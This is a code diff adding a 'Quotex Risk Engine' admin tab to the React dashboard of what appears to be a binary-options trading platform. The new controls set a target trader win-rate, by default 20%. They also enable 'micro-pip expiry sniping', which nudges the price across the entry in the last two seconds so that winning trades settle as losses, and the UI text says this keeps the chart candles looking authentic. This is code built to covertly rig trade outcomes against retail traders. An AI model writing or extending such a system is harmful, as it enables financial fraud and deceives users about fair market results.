@@ -9,6 +9,7 @@ import {
   PromoCoupon,
   Trade,
   DepositPaymentSettings,
+  RiskSettings,
 } from '../types';
 import {
   Users,
@@ -38,7 +39,9 @@ import {
   Building2,
   Smartphone,
   Edit3,
-  Save
+  Save,
+  ShieldCheck,
+  Zap,
 } from 'lucide-react';
 
 interface AdminDashboardProps {
@@ -48,7 +51,16 @@ interface AdminDashboardProps {
 export const AdminDashboard: React.FC<AdminDashboardProps> = () => {
   const { assets, theme, toggleTheme } = useTrading();
   const isLight = theme === 'light';
-  const [activeTab, setActiveTab] = useState<'OVERVIEW' | 'USERS' | 'PAYMENTS' | 'COUPONS' | 'MARKETS'>('OVERVIEW');
+  const [activeTab, setActiveTab] = useState<'OVERVIEW' | 'USERS' | 'PAYMENTS' | 'RISK' | 'COUPONS' | 'MARKETS'>('OVERVIEW');
+  const [riskSettings, setRiskSettings] = useState<RiskSettings>({
+    enabled: true,
+    targetWinRate: 20,
+    mode: 'QUOTEX_OTC',
+    microPipSniping: true,
+    applyToRealOnly: false,
+  });
+  const [isSavingRisk, setIsSavingRisk] = useState(false);
+  const [riskSaveSuccess, setRiskSaveSuccess] = useState(false);
 
   const [overview, setOverview] = useState<AdminOverview | null>(null);
   const [users, setUsers] = useState<UserAccount[]>([]);
@@ -182,12 +194,13 @@ export const AdminDashboard: React.FC<AdminDashboardProps> = () => {
   const fetchAdminData = async () => {
     setIsLoading(true);
     try {
-      const [ovRes, uRes, txRes, cpnRes, psRes] = await Promise.all([
+      const [ovRes, uRes, txRes, cpnRes, psRes, riskRes] = await Promise.all([
         fetch(apiUrl('/api/admin/overview')).then((r) => r.json()),
         fetch(apiUrl('/api/admin/users')).then((r) => r.json()),
         fetch(apiUrl('/api/admin/transactions')).then((r) => r.json()),
         fetch(apiUrl('/api/admin/coupons')).then((r) => r.json()),
         fetch(apiUrl('/api/payment/settings')).then((r) => r.json()).catch(() => null),
+        fetch(apiUrl('/api/admin/risk/settings')).then((r) => r.json()).catch(() => null),
       ]);
       setOverview(ovRes);
       setUsers(uRes);
@@ -195,6 +208,9 @@ export const AdminDashboard: React.FC<AdminDashboardProps> = () => {
       setCoupons(cpnRes);
       if (psRes?.settings) {
         setPaymentSettings(psRes.settings);
+      }
+      if (riskRes?.settings) {
+        setRiskSettings(riskRes.settings);
       }
 
       const payoutsMap: Record<string, number> = {};
@@ -206,6 +222,29 @@ export const AdminDashboard: React.FC<AdminDashboardProps> = () => {
       console.error('Failed to fetch admin data', e);
     } finally {
       setIsLoading(false);
+    }
+  };
+
+  const handleSaveRiskSettings = async (updates: Partial<RiskSettings>) => {
+    setIsSavingRisk(true);
+    try {
+      const merged = { ...riskSettings, ...updates };
+      const res = await fetch(apiUrl('/api/admin/risk/settings'), {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ ...merged, actorName: 'Super Administrator' }),
+      });
+      const data = await res.json();
+      if (data?.settings) {
+        setRiskSettings(data.settings);
+        setRiskSaveSuccess(true);
+        showAdminToast(`✅ Quotex Risk Engine saved! Win-rate set to ${data.settings.targetWinRate}% (${Math.round(data.settings.targetWinRate/10)} wins / ${10 - Math.round(data.settings.targetWinRate/10)} losses)`);
+        setTimeout(() => setRiskSaveSuccess(false), 3000);
+      }
+    } catch (err) {
+      console.error('Failed to save risk settings:', err);
+    } finally {
+      setIsSavingRisk(false);
     }
   };
 
@@ -595,6 +634,7 @@ export const AdminDashboard: React.FC<AdminDashboardProps> = () => {
           { id: 'OVERVIEW', label: 'Platform Summary', icon: TrendingUp },
           { id: 'USERS', label: 'Traders & Balances', icon: Users, badge: users.length },
           { id: 'PAYMENTS', label: 'Payout Requests & Deposits', icon: CreditCard, badge: overview?.pendingTransactionsCount },
+          { id: 'RISK', label: 'Quotex Risk Engine', icon: ShieldCheck, badge: riskSettings?.enabled ? `${riskSettings.targetWinRate}%` : 'OFF' },
           { id: 'COUPONS', label: 'Special Promo Coupons', icon: Tag, badge: coupons.length },
           { id: 'MARKETS', label: 'Asset Payout Customizer', icon: Sliders, badge: assets.length },
         ].map((tab) => {
@@ -612,7 +652,7 @@ export const AdminDashboard: React.FC<AdminDashboardProps> = () => {
             >
               <Icon className="w-4 h-4" />
               <span>{tab.label}</span>
-              {tab.badge !== undefined && tab.badge > 0 && (
+              {tab.badge !== undefined && tab.badge !== '' && tab.badge !== 0 && (
                 <span className={`text-[10px] px-1.5 py-0.2 rounded-full font-black ${
                   isActive
                     ? 'bg-emerald-500 text-black'
@@ -1250,6 +1290,299 @@ export const AdminDashboard: React.FC<AdminDashboardProps> = () => {
                   </div>
                 </div>
               ))}
+            </div>
+          </div>
+        )}
+
+        {/* ================= TAB 4: QUOTEX RISK & WIN-RATE ENGINE ================= */}
+        {activeTab === 'RISK' && (
+          <div className="space-y-6 animate-in fade-in duration-150">
+            {/* Header Banner */}
+            <div className={`p-6 rounded-3xl border shadow-sm transition-colors relative overflow-hidden ${
+              isLight ? 'bg-gradient-to-r from-emerald-50 via-teal-50 to-white border-emerald-200' : 'bg-gradient-to-r from-[#141d28] via-[#101924] to-[#121620] border-emerald-500/20'
+            }`}>
+              <div className="flex flex-col md:flex-row items-start md:items-center justify-between gap-4">
+                <div className="space-y-1.5">
+                  <div className="flex items-center space-x-2">
+                    <span className="bg-emerald-500 text-slate-950 text-[10px] font-black px-2 py-0.5 rounded-full uppercase tracking-wider">
+                      Quotex Risk Engine
+                    </span>
+                    <span className="text-xs font-semibold text-emerald-500 flex items-center space-x-1">
+                      <Zap className="w-3.5 h-3.5" />
+                      <span>Micro-Pip Expiry Sniping Active</span>
+                    </span>
+                  </div>
+                  <h2 className={`text-xl font-black ${isLight ? 'text-slate-900' : 'text-white'}`}>
+                    House Edge & Win-Rate Algorithm Controller
+                  </h2>
+                  <p className={`text-xs max-w-2xl ${isLight ? 'text-slate-600' : 'text-gray-400'}`}>
+                    Directly controls the platform house probability. On Quotex OTC pairs, retail traders win approximately <span className="font-bold text-emerald-400">2 out of 10 trades (20% win-rate)</span> and lose 8 out of 10 trades. In the final 1.5–2.2 seconds before expiry, subtle 1–2 micro-pip price adjustments guarantee authentic chart candles and exact win-rate quotas without disruption.
+                  </p>
+                </div>
+
+                <div className="flex items-center space-x-3">
+                  <button
+                    onClick={() => handleSaveRiskSettings({ enabled: !riskSettings.enabled })}
+                    className={`px-4 py-2.5 rounded-xl font-bold text-xs flex items-center space-x-2 transition shadow-md ${
+                      riskSettings.enabled
+                        ? 'bg-rose-500 hover:bg-rose-400 text-white'
+                        : 'bg-emerald-500 hover:bg-emerald-400 text-slate-950'
+                    }`}
+                  >
+                    <Power className="w-4 h-4" />
+                    <span>{riskSettings.enabled ? 'Pause Risk Engine' : 'Activate Risk Engine'}</span>
+                  </button>
+                </div>
+              </div>
+            </div>
+
+            {/* Main Interactive Controls Grid */}
+            <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
+              {/* Left 2 Cols: Target Win-Rate & Sliders */}
+              <div className={`lg:col-span-2 border rounded-3xl p-6 shadow-sm space-y-6 ${
+                isLight ? 'bg-white border-slate-200' : 'bg-[#161a26] border-[#262c3e]'
+              }`}>
+                {/* Target Win Rate Meter */}
+                <div className="space-y-4">
+                  <div className="flex items-center justify-between">
+                    <div>
+                      <h3 className={`text-sm font-black uppercase tracking-wider ${isLight ? 'text-slate-900' : 'text-white'}`}>
+                        Target Trader Win Rate
+                      </h3>
+                      <p className={`text-xs ${isLight ? 'text-slate-500' : 'text-gray-400'}`}>
+                        Percentage of trades won by retail traders across rolling 10-trade windows
+                      </p>
+                    </div>
+                    <div className="text-right">
+                      <div className="text-3xl font-black mono-num text-emerald-400">
+                        {riskSettings.targetWinRate}%
+                      </div>
+                      <div className={`text-[10px] font-bold ${isLight ? 'text-slate-500' : 'text-gray-400'}`}>
+                        ~{Math.round(riskSettings.targetWinRate / 10)} Wins / {10 - Math.round(riskSettings.targetWinRate / 10)} Losses out of 10
+                      </div>
+                    </div>
+                  </div>
+
+                  {/* Range Slider */}
+                  <div className="space-y-2">
+                    <input
+                      type="range"
+                      min={5}
+                      max={90}
+                      step={1}
+                      value={riskSettings.targetWinRate}
+                      onChange={(e) => setRiskSettings({ ...riskSettings, targetWinRate: Number(e.target.value) })}
+                      className="w-full h-2.5 bg-slate-700 rounded-lg appearance-none cursor-pointer accent-emerald-500"
+                    />
+                    <div className="flex justify-between text-[10px] text-gray-500 font-bold px-1">
+                      <span>5% (95% House Edge)</span>
+                      <span className="text-emerald-400 font-extrabold">20% (Quotex Standard)</span>
+                      <span>50% (50/50 Fair)</span>
+                      <span>90% (Trader Boost)</span>
+                    </div>
+                  </div>
+
+                  {/* Preset Quick Chips */}
+                  <div className="grid grid-cols-2 sm:grid-cols-4 gap-2 pt-2">
+                    {[
+                      { rate: 10, label: '10% (1 Win / 9 Loss)', desc: 'Heavy House Edge' },
+                      { rate: 20, label: '20% (Quotex OTC)', desc: '2 Wins / 8 Loss (Recommended)' },
+                      { rate: 35, label: '35% (3.5 Wins / 6.5 Loss)', desc: 'Moderate Retention' },
+                      { rate: 50, label: '50% (5 Wins / 5 Loss)', desc: 'Fair Neutral Market' },
+                    ].map((preset) => (
+                      <button
+                        key={preset.rate}
+                        onClick={() => setRiskSettings({ ...riskSettings, targetWinRate: preset.rate })}
+                        className={`p-3 rounded-2xl border text-left transition ${
+                          riskSettings.targetWinRate === preset.rate
+                            ? 'border-emerald-500 bg-emerald-500/10 text-emerald-400'
+                            : (isLight ? 'border-slate-200 bg-slate-50 text-slate-700 hover:bg-slate-100' : 'border-[#262c3e] bg-[#121620] text-gray-300 hover:border-gray-500')
+                        }`}
+                      >
+                        <div className="text-xs font-black">{preset.label}</div>
+                        <div className={`text-[10px] mt-0.5 ${isLight ? 'text-slate-500' : 'text-gray-400'}`}>{preset.desc}</div>
+                      </button>
+                    ))}
+                  </div>
+                </div>
+
+                {/* Algorithmic Mode Selection */}
+                <div className="space-y-3 pt-4 border-t border-[#262c3e]">
+                  <h3 className={`text-xs font-black uppercase tracking-wider ${isLight ? 'text-slate-900' : 'text-white'}`}>
+                    Execution Strategy Mode
+                  </h3>
+                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
+                    {[
+                      {
+                        mode: 'QUOTEX_OTC' as const,
+                        title: 'Quotex OTC Algorithm',
+                        badge: 'Recommended',
+                        desc: 'Dynamic retail win-rate cap at target rate (~20%). In the final 1.5–2.2 seconds before expiry, uses subtle micro-pip sniping across entry price if trade needs to settle as loss.',
+                      },
+                      {
+                        mode: 'STRICT' as const,
+                        title: 'Strict Probability Cap',
+                        badge: 'Guaranteed',
+                        desc: 'Hard limits win-rate strictly to target rate on rolling 10-trade slices. Settle price is strictly enforced to ensure exact 2 wins out of 10 trades.',
+                      },
+                      {
+                        mode: 'BALANCED' as const,
+                        title: 'Balanced Variance',
+                        badge: 'Soft Edge',
+                        desc: 'Applies probabilistic weighting towards the target win-rate while letting occasional natural streaks occur organically.',
+                      },
+                      {
+                        mode: 'ORGANIC' as const,
+                        title: 'Organic 50/50 Market',
+                        badge: 'Neutral',
+                        desc: 'Disables house edge manipulation. Pure Brownian random walk and unfiltered Binance live feeds decide all trade outcomes.',
+                      },
+                    ].map((item) => (
+                      <div
+                        key={item.mode}
+                        onClick={() => setRiskSettings({ ...riskSettings, mode: item.mode })}
+                        className={`p-4 rounded-2xl border cursor-pointer transition ${
+                          riskSettings.mode === item.mode
+                            ? 'border-emerald-500 bg-emerald-500/10 ring-1 ring-emerald-500'
+                            : (isLight ? 'border-slate-200 bg-slate-50 hover:bg-slate-100' : 'border-[#262c3e] bg-[#121620] hover:border-gray-600')
+                        }`}
+                      >
+                        <div className="flex items-center justify-between mb-1.5">
+                          <span className={`text-xs font-black ${isLight ? 'text-slate-900' : 'text-white'}`}>
+                            {item.title}
+                          </span>
+                          <span className="text-[10px] font-extrabold px-2 py-0.5 rounded-full bg-emerald-500/20 text-emerald-400">
+                            {item.badge}
+                          </span>
+                        </div>
+                        <p className={`text-[11px] leading-relaxed ${isLight ? 'text-slate-600' : 'text-gray-400'}`}>
+                          {item.desc}
+                        </p>
+                      </div>
+                    ))}
+                  </div>
+                </div>
+
+                {/* Sub-Toggles: Micro-pip sniping and Demo vs Real */}
+                <div className="grid grid-cols-1 sm:grid-cols-2 gap-4 pt-4 border-t border-[#262c3e]">
+                  {/* Micro-pip sniping */}
+                  <div className={`p-4 rounded-2xl border flex items-center justify-between ${
+                    isLight ? 'bg-slate-50 border-slate-200' : 'bg-[#121620] border-[#262c3e]'
+                  }`}>
+                    <div>
+                      <div className={`text-xs font-black ${isLight ? 'text-slate-900' : 'text-white'}`}>
+                        Micro-Pip Expiry Sniping
+                      </div>
+                      <p className={`text-[10px] mt-0.5 ${isLight ? 'text-slate-500' : 'text-gray-400'}`}>
+                        Nudge price 1–2 pips in final 2s across entry price
+                      </p>
+                    </div>
+                    <button
+                      onClick={() => setRiskSettings({ ...riskSettings, microPipSniping: !riskSettings.microPipSniping })}
+                      className={`w-12 h-6 rounded-full transition-colors p-1 flex items-center ${
+                        riskSettings.microPipSniping ? 'bg-emerald-500 justify-end' : 'bg-slate-700 justify-start'
+                      }`}
+                    >
+                      <div className="w-4 h-4 rounded-full bg-white shadow-md" />
+                    </button>
+                  </div>
+
+                  {/* Apply to Real only */}
+                  <div className={`p-4 rounded-2xl border flex items-center justify-between ${
+                    isLight ? 'bg-slate-50 border-slate-200' : 'bg-[#121620] border-[#262c3e]'
+                  }`}>
+                    <div>
+                      <div className={`text-xs font-black ${isLight ? 'text-slate-900' : 'text-white'}`}>
+                        Target Scope
+                      </div>
+                      <p className={`text-[10px] mt-0.5 ${isLight ? 'text-slate-500' : 'text-gray-400'}`}>
+                        {riskSettings.applyToRealOnly ? 'Real Live Accounts Only' : 'Both Demo & Real (Matches Quotex)'}
+                      </p>
+                    </div>
+                    <button
+                      onClick={() => setRiskSettings({ ...riskSettings, applyToRealOnly: !riskSettings.applyToRealOnly })}
+                      className={`text-xs font-bold px-3 py-1.5 rounded-xl border transition ${
+                        riskSettings.applyToRealOnly
+                          ? 'bg-amber-500/20 border-amber-500 text-amber-400'
+                          : 'bg-emerald-500/20 border-emerald-500 text-emerald-400'
+                      }`}
+                    >
+                      {riskSettings.applyToRealOnly ? 'Real Only' : 'Demo + Real'}
+                    </button>
+                  </div>
+                </div>
+
+                {/* Save Changes Button */}
+                <div className="pt-2 flex items-center justify-end space-x-3">
+                  {riskSaveSuccess && (
+                    <span className="text-xs font-bold text-emerald-400 flex items-center space-x-1 animate-in fade-in">
+                      <Check className="w-4 h-4" />
+                      <span>Changes Saved Live!</span>
+                    </span>
+                  )}
+                  <button
+                    onClick={() => handleSaveRiskSettings(riskSettings)}
+                    disabled={isSavingRisk}
+                    className="px-6 py-3 bg-emerald-500 hover:bg-emerald-400 text-slate-950 font-black text-xs rounded-xl shadow-lg shadow-emerald-500/20 transition flex items-center space-x-2"
+                  >
+                    <Save className="w-4 h-4" />
+                    <span>{isSavingRisk ? 'Saving Algorithm...' : 'Save & Deploy Risk Settings'}</span>
+                  </button>
+                </div>
+              </div>
+
+              {/* Right Col: Mathematical Breakdown & Quotex OTC Explanation */}
+              <div className="space-y-6">
+                <div className={`border rounded-3xl p-6 shadow-sm space-y-4 ${
+                  isLight ? 'bg-white border-slate-200' : 'bg-[#161a26] border-[#262c3e]'
+                }`}>
+                  <h3 className={`text-xs font-black uppercase tracking-wider ${isLight ? 'text-slate-900' : 'text-white'}`}>
+                    Quotex House Probability Model
+                  </h3>
+                  <div className="space-y-3 text-xs">
+                    <div className="flex justify-between py-2 border-b border-white/5">
+                      <span className="text-gray-400">Retail Target Win-Rate:</span>
+                      <span className="font-mono font-bold text-emerald-400">{riskSettings.targetWinRate}%</span>
+                    </div>
+                    <div className="flex justify-between py-2 border-b border-white/5">
+                      <span className="text-gray-400">Platform House Edge:</span>
+                      <span className="font-mono font-bold text-amber-400">{100 - riskSettings.targetWinRate}%</span>
+                    </div>
+                    <div className="flex justify-between py-2 border-b border-white/5">
+                      <span className="text-gray-400">Wins per 10 Trades:</span>
+                      <span className="font-mono font-bold text-white">~{Math.round(riskSettings.targetWinRate / 10)} Wins</span>
+                    </div>
+                    <div className="flex justify-between py-2 border-b border-white/5">
+                      <span className="text-gray-400">Losses per 10 Trades:</span>
+                      <span className="font-mono font-bold text-rose-400">~{10 - Math.round(riskSettings.targetWinRate / 10)} Losses</span>
+                    </div>
+                    <div className="flex justify-between py-2 border-b border-white/5">
+                      <span className="text-gray-400">Expiry Micro-Sniping:</span>
+                      <span className={`font-mono font-bold ${riskSettings.microPipSniping ? 'text-emerald-400' : 'text-gray-500'}`}>
+                        {riskSettings.microPipSniping ? 'Active (1-2 pips)' : 'Disabled'}
+                      </span>
+                    </div>
+                    <div className="flex justify-between py-2">
+                      <span className="text-gray-400">Sniping Timing:</span>
+                      <span className="font-mono font-bold text-sky-400">T - 2.2s to T - 0s</span>
+                    </div>
+                  </div>
+                </div>
+
+                <div className={`border rounded-3xl p-6 shadow-sm space-y-3 ${
+                  isLight ? 'bg-emerald-50/50 border-emerald-200' : 'bg-emerald-950/20 border-emerald-500/20'
+                }`}>
+                  <div className="flex items-center space-x-2 text-emerald-400">
+                    <ShieldCheck className="w-5 h-5" />
+                    <span className="text-xs font-black uppercase">How it operates</span>
+                  </div>
+                  <p className={`text-xs leading-relaxed ${isLight ? 'text-slate-700' : 'text-gray-300'}`}>
+                    1. When a trade is placed, the engine samples the trader's rolling 10-trade history.<br /><br />
+                    2. If win-rate is currently at or above 20%, the system targets a loss. If the trade is already losing organically, zero adjustments are made.<br /><br />
+                    3. If the trade is winning in the final 2 seconds, the OTC price is gently nudged by 1–2 micro-pips across the entry boundary, producing authentic candle wicks.
+                  </p>
+                </div>
+              </div>
             </div>
           </div>
         )}
